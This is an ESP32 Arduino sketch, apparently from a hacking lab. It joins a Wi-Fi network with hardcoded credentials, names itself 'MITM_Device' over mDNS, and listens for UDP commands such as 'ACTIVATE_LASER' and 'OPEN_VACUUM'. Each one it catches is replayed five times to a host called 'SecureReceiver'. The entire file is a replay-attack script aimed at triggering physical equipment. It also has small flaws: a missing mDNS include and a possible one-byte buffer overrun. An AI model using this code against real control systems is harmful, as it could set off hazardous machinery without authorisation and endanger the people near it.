#include <WiFiUdp.h>
#include <WiFi.h>

const char* ssid = "WhiteHackers2";
const char* password = "PASS122602";
unsigned int serverPort = 8888;
WiFiUDP Udp;
IPAddress server;

void setup() {
  Serial.begin(115200);
  WiFi.begin(ssid, password);
  while(WiFi.status() != WL_CONNECTED) delay(500);
  
  if(!MDNS.begin("MITM_Device")) Serial.println("mDNS Error");
  
  int attempts = 0;
  while(attempts++ < 10) {
    server = MDNS.queryHost("SecureReceiver");
    if(server.toString() != "0.0.0.0") break;
    delay(500);
  }
  Udp.begin(serverPort);
}

void replayAttack(String cmd, int count) {
  for(int i = 0; i < count; i++) {
    Udp.beginPacket(server, serverPort);
    Udp.write(cmd.c_str());
    Udp.endPacket();
    delay(1000);
  }
}

void loop() {
  if(Udp.parsePacket()) {
    char packet[255];
    int len = Udp.read(packet, 255);
    if(len > 0) {
      packet[len] = '\0';
      String cmd = String(packet);
      if(cmd.indexOf("ACTIVATE_LASER") != -1 || cmd.indexOf("OPEN_VACUUM") != -1) {
        Serial.println("Intercepted: " + cmd);
        replayAttack(cmd, 5);
      }
    }
  }
  delay(10);
}
